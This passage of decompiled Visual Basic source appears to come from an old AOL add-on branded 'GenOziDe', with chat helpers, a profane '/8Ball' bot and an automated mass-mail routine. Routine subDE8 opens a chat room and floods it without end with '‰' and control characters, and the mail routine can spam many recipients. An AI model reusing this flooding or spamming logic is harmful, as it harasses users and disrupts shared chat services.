        l097C$ = String(255, 0)
        l0974% = extfn4B28(l096E%, l0978, l097C$, 255, gc05CE)
        l097C$ = Left(l097C$, l0974%)
        If l097C$ = "&FATE Infinity" Then
            l0974% = extfn2D68(l096E%, l0978, gc05CE)
            l0978 = l0978 - 1
            l0970 = l0970 - 1
        End If
    Next l0978
    extsub2C18 (l096C%)
l097E% = extfn2EB8("aol Frame25", 0&)
l0980% = extfn4CE8(l097E%, gc05D6, 0, "America  Online")
End
End Sub

Sub subB80 (p0984 As ListBox, ByVal p0986 As String)
Dim l0988 As Variant
Do
If LCase$(p0984.List(l0988)) = LCase$(p0986$) Then p0984.RemoveItem (l0988)
l0988 = 1 + l0988
Loop Until l0988 >= p0984.ListCount
End Sub

Sub subC60 (p09EA As TextBox)
Dim l09EC As String
Dim l09EE As Integer
Dim l09F0 As Integer
Dim l09F2 As String
Dim l09F4 As String
Dim l09F6 As String
Dim l09F8 As String
Dim l09FA As Integer
Dim l09FC As Integer
Dim l09FE As Integer
l09EE = extfn2EB8("AOL Frame25", 0&)
l09F0 = extfn4D90(l09EE, "_AOL_View")
l09F2 = fn2BA8(l09F0)
If l09EC = "" Then l09EC = l09F2
If l09F2 = l09EC Then Exit Sub
l09EC = l09F2
l09F4 = fn13D0(l09F2)
l09F6 = Mid(l09F4, 2, InStr(l09F4, ":") - 2)
l09F8$ = Mid(l09F4, Len(l09F6) + 4, Len(l09F4) - Len(l09F6))
If LCase(Trim(fn28D0(l09F6))) = LCase(Trim(fn28D0(p09EA.Text))) Then
l09FA = extfn4DC8(l09F0)
l09FC = extfn4D90(l09FA, "_AOL_Edit")
sub2400 l09F8$
l09FE = extfn4C78(l09FC, &H102, 13, 0&)
End If
End Sub

Sub subC8 (p0676 As String, p067A As ListBox)
Dim l067C As Variant
Dim l0680 As String
Dim l0682 As Variant
If p067A.ListCount = 0 Then
p067A.AddItem p0676
Exit Sub
End If
Do Until l067C = (p067A.ListCount)
Let l0680$ = p067A.List(l067C)
If Trim(LCase(l0680$)) = Trim(LCase(p0676)) Then Let l0682 = "NO"
Let l067C = l067C + 1
Loop
If l0682 = "NO" Then Exit Sub
p067A.AddItem p0676
End Sub

Sub subC98 ()
Dim l0A00 As String
Dim l0A02 As String
Dim l0A04 As Integer
Dim l0A06 As Integer
Dim l0A08 As String
Dim l0A0A As String
Dim l0A0C As String
Dim l0A0E As String
Dim l0A10 As Integer
Dim l0A12 As Integer
Dim l0A1A As Variant
Dim l0A1E As Variant
Dim l0A22 As Variant

L575E:
l0A1A = fn1520()
l0A04 = extfn2EB8("AOL Frame25", 0&)
l0A06 = extfn4D90(l0A04, "_AOL_View")
l0A08 = fn2BA8(l0A06)
If l0A00 = "" Then l0A00 = l0A08
If l0A08 = l0A00 Then Exit Sub
l0A00 = l0A08
l0A0A = fn13D0(l0A08)
l0A0C = Mid(l0A0A, 2, InStr(l0A0A, ":") - 2)
l0A0E = Mid(l0A0A, Len(l0A0C) + 4, Len(l0A0A) - Len(l0A0C))
If LCase(Trim(fn28D0(l0A1A))) = LCase(Trim(fn28D0(l0A0C))) Then GoTo L575E
l0A10 = extfn4DC8(l0A06)
l0A12 = extfn4D90(l0A10, "_AOL_Edit")
l0A1E = fn2010(11)
If l0A1E = "1" Then
l0A1E = "Looks doubtful."
ElseIf l0A1E = "2" Then l0A1E = "Definately YES!"
ElseIf l0A1E = "3" Then l0A1E = "Definately No!"
ElseIf l0A1E = "4" Then l0A1E = "Not a FuKin chance"
ElseIf l0A1E = "5" Then l0A1E = "HEEELLLLLLLLLLLLLLL nO"
ElseIf l0A1E = "6" Then l0A1E = "HeLL yeA!"
ElseIf l0A1E = "7" Then l0A1E = "Response HaZey try again."
ElseIf l0A1E = "8" Then l0A1E = "ProbabLee"
ElseIf l0A1E = "9" Then l0A1E = "yep yep"
ElseIf l0A1E = "10" Then l0A1E = "I'm not suRe"
ElseIf l0A1E = "11" Then l0A1E = "AbsolootLee yeZ"
End If
l0A02 = l0A0E$
l0A22 = InStr(LCase$(l0A02), LCase$("/8Ball"))
If l0A22 <> 0 Then
sub2400 "•––•^v^•{‡ " & l0A0C & ", The 8-ball say: " & l0A1E
sub27F0 .5
GoTo L575E
End If
End Sub

Sub subCD0 (p0A28 As TextBox)
Randomize
p0A28 = Int((Val("11") * Rnd) + 1)
If p0A28 = "1" Then
p0A28 = "Looks doubtful."
ElseIf p0A28 = "2" Then p0A28 = "Definately YES!"
ElseIf p0A28 = "3" Then p0A28 = "Definately No!"
ElseIf p0A28 = "4" Then p0A28 = "Not a FuKin chance"
ElseIf p0A28 = "5" Then p0A28 = "HEEELLLLLLLLLLLLLLL nO"
ElseIf p0A28 = "6" Then p0A28 = "HeLL yeA!"
ElseIf p0A28 = "7" Then p0A28 = "Response HaZey try again."
ElseIf p0A28 = "8" Then p0A28 = "ProbabLee"
ElseIf p0A28 = "9" Then p0A28 = "yep yep"
ElseIf p0A28 = "10" Then p0A28 = "I'm not suRe"
ElseIf p0A28 = "11" Then p0A28 = "AbsolootLee yeZ"
End If
End Sub

Sub subD08 (p0A2C As ListBox, p0A2E As String, p0A32 As ListBox)
Dim l0A38 As Integer
Dim l0A3A As Integer
Dim l0A3C As Integer
Dim l0A3E As Integer
Dim l0A40 As Integer
Dim l0A42 As Integer
Dim l0A44 As Integer
Dim l0A46 As Integer
Dim l0A48 As Integer
Dim l0A4A As Integer
Dim l0A4C As Integer
Dim l0A4E As Integer
Dim l0A50 As Integer
Dim l0A52 As Integer
Dim l0A54 As Integer
Dim l0A56 As Integer
Dim l0A58 As Integer
Dim l0A5A As Integer
Dim l0A5C As Integer
Dim l0A5E As String
Dim l0A60 As Variant
Dim l0A64 As Variant
Dim l0A68 As String
Dim l0A6A As String
Dim l0A6C As Integer
Dim l0A6E As Variant
Dim l0A72 As Variant
Call sub2278(3, 1)
l0A38% = fn2A20("Compose Mail", "AOL Child")
l0A3A% = extfn4C40(l0A38%, 5)
l0A3C% = extfn4C40(l0A3A%, 2)
l0A3E% = extfn4C40(l0A3C%, 2)
l0A40% = extfn4C40(l0A3E%, 2)
l0A42% = extfn4C40(l0A40%, 2)
l0A44% = extfn4C40(l0A42%, 2)
l0A46% = extfn4C40(l0A44%, 2)
l0A48% = extfn4C40(l0A46%, 2)
l0A4A% = extfn4C40(l0A48%, 2)
l0A4C% = extfn4C40(l0A4A%, 2)
l0A4E% = extfn4C40(l0A4C%, 2)
l0A50% = extfn4C40(l0A4E%, 2)
l0A52% = extfn4C40(l0A50%, 2)
l0A54% = extfn4C40(l0A52%, 2)
l0A56% = extfn4D90(l0A38%, "#32770")
l0A58% = extfn4D90(l0A5C%, "Edit")
l0A5A% = extfn4D90(l0A38%, "RICHCNTL")
Do
Loop Until l0A4C% <> 0
l0A5E$ = ""
For l0A60 = 0 To p0A2C.ListCount - 1
l0A5E$ = l0A5E$ + p0A2C.List(l0A60) + ", "
l0A64 = extfn4CE8(l0A4C%, gc05D6, 0, l0A5E$)
Next l0A60
sub27F0 1
sub27B8 l0A54%, CStr(p0A2E$)
l0A68$ = ""
For l0A60 = 0 To p0A32.ListCount - 1
l0A68$ = l0A68$ + p0A32.List(l0A60) & Chr(13)
l0A6A$ = "——§—— G e n O z i D e ——§——"
l0A64 = extfn4CE8(l0A6C%, gc05D6, 0, l0A68$ & Chr(13) & Chr(13) & Chr(13) & l0A6A$)
l0A72 = extfn4CE8(l0A6E, gc05D6, 0, l0A68$ & Chr(13) & Chr(13) & Chr(13) & l0A6A$)
Next l0A60
sub27B8 l0A5A%, CStr(l0A68$)
sub27F0 .2
    sub9F8 (l0A3C%)
End Sub

Sub subD40 (p0A78 As TextBox, p0A7A As Variant, p0A7E As String, p0A80 As String)
Dim l0A82 As Integer
Dim l0A84 As Integer
Dim l0A86 As Variant
Do
Call sub1BE8((p0A7A), (p0A7E$), (p0A80$))
p0A78 = Str(Val(p0A78 - 1))
Loop Until p0A78 = 0
l0A82% = extfn2EB8("aol Frame25", 0&)
l0A84% = extfn4D58(l0A82%, "Compose Mail")
If l0A84% <> 0 Then
Do
l0A82% = extfn2EB8("aol Frame25", 0&)
l0A84% = extfn4D58(l0A82%, "Compose Mail")
l0A86 = extfn4CB0(l0A84%, gc0024, 0, 0)
Loop Until l0A84% = 0
End If
End Sub

Sub subDE8 (p0ABE As String)
Dim l0AC0 As Integer
Dim l0AC2 As Integer
Dim l0AC4 As Integer
Dim l0AC6 As Integer

L6B2E:
Call sub1980("aol://2719:2-2-" & (p0ABE$))
l0AC0% = extfn2EB8("aol Frame25", 0&)
l0AC2% = extfn4D90(l0AC0%, "MDIClient")
l0AC4% = extfn4D90(l0AC2%, "AOL Child")
l0AC6% = extfn4D58(l0AC2%, (p0ABE$))
sub2400 "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "~~>GenOziDe "
sub27F0 .2
sub2400 "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "~~>GenOziDe "
sub27F0 .2
sub2400 "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "~~>GenOziDe "
sub27F0 .2
sub2400 "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "~~>GenOziDe "
sub27F0 .2
GoTo L6B2E
End Sub

Sub subF00 (p0B02 As String)
Dim l0B04 As String
Dim l0B06 As Variant
Dim l0B0A As String
Dim l0B0C As String
L797A:
l0B04$ = fn4B8()
l0B06 = InStr(LCase$(l0B04$), LCase$(p0B02$))
l0B0A$ = Left(l0B04$, InStr(l0B04$, ":") - 1)
l0B0C$ = Right(l0B04$, Len(l0B04$) - Len(l0B0A$) - 2)
End Sub

